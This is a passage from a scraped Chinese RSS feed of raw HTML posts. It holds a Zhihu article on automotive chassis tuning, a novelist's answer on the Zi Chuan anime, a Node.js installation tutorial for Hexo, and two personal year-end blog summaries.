data-pid=\"PPEI8YU_\">通常主观评价评分体系将性能等价分为10级，最好得10分，最差为0分，评分以蝴蝶图的方式呈现。图2为某车型调校前主观评价结果、竞标车评价结果以及该车型期望达到的目标值。 最终目标是缩小该车型与竞标车的差距， 并在完成调校后使得该车型的主观评价评分不低于目标值。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5a666ff35d70cf8d0ada960207e9b67e_b.jpg\" data-size=\"normal\" data-rawwidth=\"1282\" data-rawheight=\"1022\" class=\"origin_image zh-lightbox-thumb\" width=\"1282\" data-original=\"https://pic3.zhimg.com/v2-5a666ff35d70cf8d0ada960207e9b67e_r.jpg\"><figcaption>图2 某车型与竞标车型评价结果及目标设定值</figcaption></figure><ol><li data-pid=\"c3RuDmVA\">\n<b>虚拟调校法 </b>主观评价法存在难以量化的局限性，汽车企业会采用一些商业软件对整车进行虚拟样机建模并完成模型标定，展开调校结果的定性验证。常用的软件有多刚体动力学软件Adams/ car、carsim等。仿真验证是根据国家标准进行，如《GB/T4970-2009 汽车平顺性试验方法》、《GB∕T 6323-2014 汽车操纵稳定性试验方法》等标准。底盘调校中重要研究对象是悬架，悬架的K&amp;C 性能是不能不知的概念。</li></ol>\n<p data-pid=\"TxFVTUXG\"><b>K&amp;C 性能：</b>K代表英文 Kinematic， 即不考虑力和质量的运动，而只跟悬架连杆有关的车轮运动； C代表英文Compliance，也就是由于施加力导致的变形，跟悬架系统的弹簧、橡胶衬套以及零部件的变形有关的车轮运动。</p>\n<p data-pid=\"0EkqPJ9G\">悬架系统K&amp;C试验就是在台架上模拟道路激励导致的悬架运动。近年来，随着计算机仿真技术的发展，运用软件对悬架系统K&amp;C特性进行仿真的结果已经能够较好地和试验结果相吻合。K&amp;C特性研究可在整车前期开发阶段进行悬架系统的架构；在虚拟评审阶段验证悬架和整车动力学仿真模型；在逆向设计和对比车型的研究中，进行竞争车型调查研究；在样车试制的各个不同阶段，支持底盘调试工作。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"2mThyvqT\"><b><i>三、底盘调校流程</i></b></p>\n<p data-pid=\"6vOvPJAM\">国内各主机厂底盘调校流程大同小异，如图3所示。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8531e67274378866bfd07a6a04178158_b.jpg\" data-size=\"normal\" data-rawwidth=\"277\" data-rawheight=\"408\" class=\"content_image\" width=\"277\"><figcaption>图3 底盘调教流程示意图</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"Z-XnW1gy\">调校基本要求如下：</p>\n<p data-pid=\"Z4zLJPR7\">①试验车辆的准备及检查：轮胎气压与定位参数达到设计状态，整车姿态与</p>\n<p data-pid=\"dO0-FvAb\">设计目标一致、整车状态良好； </p>\n<p data-pid=\"95IGsw91\">②试验场地：普通公路、高速公路、蛇形路面、坏路路面、山区路面、操控</p>\n<p data-pid=\"wPeZTotq\">跑道、动态试验广场，因调校本身具有危险性，所以要求以上路面无行人； </p>\n<p data-pid=\"u0tVFrzY\">③载荷：整备质量+1驾驶者+1-2 乘客，满载；</p>\n<p data-pid=\"LB4Cpahn\">在调校的过程中，会有针对性的对零部件进行更换调整，然后根据评价结果做出相应的记录。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<ol><li data-pid=\"wbPfITbp\"><b>悬架弹簧的调校 </b></li></ol>\n<p data-pid=\"XKgmG8Hp\">汽车是一个复杂的多自由度振动系统，总布置设计时会将汽车质量分配系数设计在1附近，这样前、后悬架的振动就可以相互不影响，也叫解耦。经过简化可将前后悬分别看作是单质量的振动系统，见图4，频率公式为（1）式。                          </p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-147a66ddd84c53882871ff8a659658fd_b.jpg\" data-size=\"normal\" data-rawwidth=\"763\" data-rawheight=\"278\" class=\"origin_image zh-lightbox-thumb\" width=\"763\" data-original=\"https://pic2.zhimg.com/v2-147a66ddd84c53882871ff8a659658fd_r.jpg\"><figcaption>图4 频率公示</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"QYy9xMqj\">车身振动频率<i>f0</i>设计值一般与人体走动时的振动频率接近，为了获得更好的舒适性，可适当降低前、后悬架的刚度，使前、后偏频小于1。但悬架刚度减小会使悬架的静挠度过大，悬架的运动行程有限，悬架偏频不能降低过多。悬架设计时会采用如多体动力学软件 ADAMS 进行模拟分析，确定得到前后弹簧刚度，再通过主观评价方法对前后弹簧的匹配方案进行测试，让车辆在行驶过程中拥有平衡良好的前后悬架。</p>\n<ol><li data-pid=\"xGF0M9Mm\"><b>横向稳定杆的调校</b></li></ol>\n<p data-pid=\"qEgz3geV\">汽车转弯行驶时车身侧倾严重，或通过 K&amp;C 试验发现某车的侧倾刚度较小时，需要对侧倾刚度进行调校。提高汽车侧倾刚度多采用增设横向稳定杆来实现。横向稳定杆又称防倾杆，是汽车悬架中的一种辅助弹性元件。它的作用是防止车身在转弯时发生过大的横向侧倾。横向稳定杆是用弹簧钢制成的扭杆弹簧，形状呈“U”形，横置在汽车的前端和后端，如图5所示。杆身的中部，用套筒与车架铰接，杆的两端分别固定在左右悬架上。当车身只作垂直运动时，两侧悬架变形相同，横向稳定杆不起作用。当车身侧倾时，两侧悬架跳动不一致，横向稳定杆发生扭转，杆身的弹力成为继续侧倾的阻力，起到横向稳定的作用。  </p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-a3a81f9f765167580c040aa1060c835b_b.jpg\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"623\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-a3a81f9f765167580c040aa1060c835b_r.jpg\"><figcaption>图5 汽车横向稳定杆</figcaption></figure><p data-pid=\"gnijadUJ\">弹簧刚度选定后，进行稳定杆的匹配。选定稳定杆要根据车型前期的目标设定和调校风格进行选择，太粗的稳定杆，能提供很好的侧倾控制，但是会带来平顺性的恶化和更大的<b>转向不足</b>，选择合适的稳定杆和稳定杆衬套，既能让车辆的侧倾控制合理，又能保证车辆的响应性和较好的平顺性。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<ol><li data-pid=\"JDmkQ3CZ\"><b>减振器阻尼调校</b></li></ol>\n<p data-pid=\"R6d4hunG\">减振器调校在整个底盘调校的过程中是最为关键，是对提升整个底盘的品质感影响最重要的调校要素。项目开发初期，根据车型底盘调校属性目标，首先确定阀系类型，不同的阀系结构对性能的影响较大。减振器调校主要调校活塞和底阀的阻尼孔、阀片、节流片开口面积、补偿阀片。不同的阀系组合，即便是相同的阻尼力也会有不同的乘车体验。主要影响车辆的初始侧倾控制、中心区响应、路面的过滤能力、小激励的柔和感；中速一般指的是 0.1-0.6m/s，主要影响中等冲击的衰减控制、非中心区车辆响应、车身姿态控制；高速一般指的是 0.6-1.5m/s，该速度段主要影响大冲击的隔离感、车身受到大激励时车身的控制、极限操稳时车身姿态的控制。 </p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-14b59cbda99f773a74ba67fbbceb40de_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"600\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic3.zhimg.com/v2-14b59cbda99f773a74ba67fbbceb40de_r.jpg\"></figure><p data-pid=\"aH9srfu7\">减振器调校则相对比较复杂，由于其运动速度范围较大（一般为 0.05m/s～ 1.5m/s），每个速度段都影响到相应的性能。比如，对于悬架舒适性，低速段阻尼力控制车身姿态，中速段阻尼力影响次级舒适性，高速段阻尼力决定大冲击感。而对于操控性，中低速阻尼力影响紧急变线时的侧倾支撑感，同时也影响转向中心感等，</p>\n<ol><li data-pid=\"HcR73Xin\"><b>缓冲块和衬套的调校</b></li></ol>\n<p data-pid=\"RiZJ6qQk\">例如某车后悬架的冲击舒适性较差，这时就需要考虑弹簧与缓冲块的合理匹配。采用延长缓冲块作用时间可以避免频繁地触碰缓冲块，或减小缓冲块刚度以避免接触时带来的突变感。可从缓冲块长度及刚度特性曲线着手，制定后悬架缓冲块方案。也可通过仿真对该车后悬冲击舒适性灵敏度进行分析，如发现后纵臂安装轴套及后副车架安装轴套对振动加速度影响较大，可改变各轴套等的纵向、垂向静刚度进行性能的调校。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-5bf862107833d405ae3da3d324e824cc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"900\" data-rawheight=\"570\" class=\"origin_image zh-lightbox-thumb\" width=\"900\" data-original=\"https://pic1.zhimg.com/v2-5bf862107833d405ae3da3d324e824cc_r.jpg\"></figure><ol><li data-pid=\"dcm257ZE\"><b>转向系统的调校</b></li></ol>\n<p data-pid=\"al7HU1em\">   电动助力转向系统（EPS）的调校过程主要是对软件各部分进行匹配调校。例如，通过对EPS基础助力、回正、阻尼以及转动惯量参数的匹配调校，使转向性</p>\n<p data-pid=\"e8FogbPZ\">能达到低速轻便、高速稳重的感觉。这里尤其要关注转向机和电动机摩擦力大小，其对转向的手感会产生较大的影响，所以系统内摩擦需控制在一个较低的范围，才能给用户一个好的转向手感。</p>\n<p data-pid=\"RRrYlMva\">    转向系统还可能出现左右转向力不对称问题、转向力增长不均匀问题、大转角下转向力偏大、转向与悬架干涉等问题。可采取选择合适的转向机、改变转向系设计硬点、合理匹配转向柱 2个万向节相位角、改变动力转向泵的设计油压等措施进行调校。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"C04JOn-G\"><b>结束语：</b></p>\n<p data-pid=\"ZtGyJAfo\">底盘调校包含：悬架弹簧调校、稳定杆的调校、橡胶衬套的调校、前后缓冲块的调校、减振器调校、转向系的调校等。底盘调校过程是一个多种部件多种性能互相平衡的一个过程，调校的过程中需综合考虑车型的风格定位及操稳、平顺性能的平衡。 </p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"3frkifw-\">参考文献</p>\n<ol>\n<li data-pid=\"9nOq-Gqi\">余志生. 汽车理论. 机械工业出版社. 2018.9</li>\n<li data-pid=\"oGjWCRFf\">沙雷等. 某轿车操纵稳定性及舒适性底盘调校方法研究.中国汽车</li>\n<li data-pid=\"4x2I9T1P\">梁阿南. 车辆底盘性能调校分析.汽车工艺师.2021.9</li>\n</ol>\n<hr>\n<p data-pid=\"Kvw9AtTc\"><b><i>记得关注我新开的专栏，每周会更新汽车类相关知识～～</i></b></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/green-49-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Green</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/464700398?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"如何评价《紫川》动画第 9 集的帝林行为？","date":"2022-02-08 11:34:12","description":"\n<p data-pid=\"3qT7MbvV\">今天，紫川动画第九集开播，猪期待已久的帝都流血夜剧情终于出来了。</p>\n<p data-pid=\"YDjZNKn_\">    帝都流血夜是紫川第一部的高潮，也是三兄弟性格展现、人性冲突的一场剧，三人今后的道路和命运都在这一夜被决定了，可以说是紫川第一部里最重要的戏份了。</p>\n<p data-pid=\"x42aOz-f\">    因为故事激烈，猪当年是写得很舒畅的。感谢动画制作团队的用心，将这一幕剧情呈现得很符合猪心意，尤其是将总长参星的狠辣和阴险表现得很到位，将原作里一些遗漏和缺陷的情节也做了弥补，猪很是满意，中午和猪老婆一起美滋滋地看了动画，感觉甚是意得志满。</p>\n<p data-pid=\"uCxsWgnL\">     但孔圣人是怎么说的？天下唯女人难缠也！不学无术的猪老婆甚是可恶，看完以后居然大发厥辞，说动画很精彩，但原作写得太粗糙简单，破绽太多！</p>\n<p data-pid=\"3sS1v1Lv\">这蠢婆娘专门抬杠，差点把猪给气死。</p>\n<p data-pid=\"lxVv8ZIf\">猪婆娘蠢言论：“这场政变虎头蛇尾，这么简单就被平定了，杨明华是送死来的，他根本就一点胜算都没有，本就不应该发动这场叛乱的！”</p>\n<p data-pid=\"BTcf5FIN\">猪：错！在杨明华看来，他的优势很大！</p>\n<p data-pid=\"JC6-mKRN\">政变前，帝都的武装力量本来有三部分：中央军，是帝都最大也是最强的武装力量，足有十万兵马，军团长雷迅，是杨明华的亲信；禁卫军，约一万来人，负责总长府的保卫，是忠于总长的；另外还有负责城内秩序的总监察厅宪兵部队，人数也是数千人，是总监察长萧龙统带。至于其他的治部少治安警察在这里基本只有当观众的份了。</p>\n<p data-pid=\"vFjU5Khd\">本来，总长紫川参星一直就是靠禁军和监察厅的宪兵，才勉强和掌握中央军的杨明华维持了一个危险的弱势平衡，但政变之前，总监察长萧龙被杨明华拉拢了过去，帝都城内局势陡然失衡，何况杨明华还召来了帝林统带的远东边军呢？在政变前的杨明华看来，自己掌握了帝都城内、城外的三大部队，对付只有万把人的禁军，那简直是飞龙骑脸想输都难，他不动手还等什么？</p>\n<p data-pid=\"ISjwyJU7\">杨明华最大的错误，是没看破帝林是紫川参星安插的卧底，还让他统带了关键的远东边军进城，这导致了他最终的失败。</p>\n<p data-pid=\"bFJLBMJO\">猪婆娘：“杨明华兵力本身足够，还画蛇添足叫帝林带兵回来干什么？他让中央军直接攻打总长府不就得了？”</p>\n<p data-pid=\"meZiwgcN\">猪：在雷迅统带下，中央军的政治立场是倾向于杨明华一方的，但他们毕竟也是紫川家的军官，要他们主动攻打紫川家的总长府跟禁军厮杀，同时还要背一个弑主的名声，大部分中央军军人是不会愿意的。</p>\n<p data-pid=\"TYTEWetg\">因为中央军和禁军的士兵都是大多出身帝都本地人，大家本乡本土，搞不好沾亲带故的，都是亲戚街坊邻居朋友，干这种造反、沾血又坏名声的事，动员起来是很有难度的。剧情里，紫川秀能稳住中央军不参与叛乱，一个很大的原因就是中央军的军官团本来就有置身事外的强烈意愿。</p>\n<p data-pid=\"21uCDGlC\">但是远东边军就不同了。边军跟帝都老百姓没交情，下得了狠手。在帝都干杀人放火的事他们是毫无压力的。在杨明华的原计划里，帝林带的远东军回来就是当刀子的，而帝都的中央军是用来压阵和事后收拾残局的，两支兵马互相制衡。没料到事与愿违，帝林这把刀子却是捅向了他自己。</p>\n<p data-pid=\"nnbHBLGR\">猪婆娘蠢言论：“既然杨明华优势很巨大，他为什么不趁早篡位，要拖那么久？”</p>\n<p data-pid=\"rpXHwnS4\">猪：杨明华在帝都城内确实占尽优势，但他一直不敢篡位，主要障碍倒不是总长府里的那万把禁卫军，而是另外两个原因。</p>\n<p data-pid=\"F_tZNlXi\">一是元老院。后面的三杰之乱里我们就看到，一个得不到元老会承认和支持的叛逆者，即使能攻下总长府杀了总长，他的处境也会非常艰难的。作为一个老谋深算的政治家，杨明华不能不考虑到后果。</p>\n<p data-pid=\"VC01sb77\">二是驻守各地的带兵统领，像哥应星、明辉、方劲等人。紫川参星虽然暗弱，但他毕竟还是紫川家明面上的主君，他被弑杀的消息传出去，统领们做出什么反应是难以预估的。所以，杨明华必须要准备好应付他们的暗手以后才能动手。</p>\n<p data-pid=\"TPL6DGGk\">也正是因为有着元老院和统领们的支持，紫川参星这个弱势总长才能对上强势的杨明华坚持那么多年。紫川参星和杨明华，他们二人之间有点像洪秀全和杨秀清，洪秀全拥有大势和名分，杨秀清则拥有实力上的优势。二人之间的斗争，谁赢都有可能，胜负也只是一线，不能说哪一方是压倒性优势或者毫无机会的。</p>\n<p data-pid=\"HqZlmYop\">辨了一个中午，最后，杠精猪老婆哑口无言，猪大获全胜，鼻孔朝天。</p>\n<p data-pid=\"ZEHa1MK5\">总之，对于这一集帝都流血夜，猪是很满意的~~感谢腾讯、铸梦工作室和万维猫动画的兄弟姐妹们，你们出色地复现了原作剧情，表达了猪的想法，让猪当年梦想的世界和故事得以活灵活现地呈现出来，与喜欢的读者们一同分享！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lao-zhu-xian-sheng-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">老猪先生</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/515346314/answer/2339541559?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/509782571?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《紫川》动画版第四集？</a><br><a href=\"http://www.zhihu.com/question/512153694?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《紫川》的制作呈现？</a><br>\n","link":"http://www.zhihu.com/question/515346314/answer/2339541559?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" 